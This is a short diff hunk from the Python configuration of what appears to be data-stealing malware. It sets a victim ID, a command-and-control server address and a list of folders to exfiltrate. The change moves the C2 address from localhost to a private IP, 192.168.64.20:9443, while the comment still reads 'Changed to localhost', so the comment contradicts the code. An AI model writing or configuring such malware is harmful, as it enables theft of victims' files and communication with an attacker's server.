@@ -34,7 +34,7 @@ class Config:
         self.VICTIM_ID = self._generate_victim_id()
         
         # C2 Server address
-        self.C2_SERVER = "http://localhost:9443"  # Changed to localhost
+        self.C2_SERVER = "192.168.64.20:9443"  # Changed to localhost
         
         # Folders to exfiltrate (REAL ACCESSIBLE FOLDERS)
         self.EXFIL_SOURCES = [
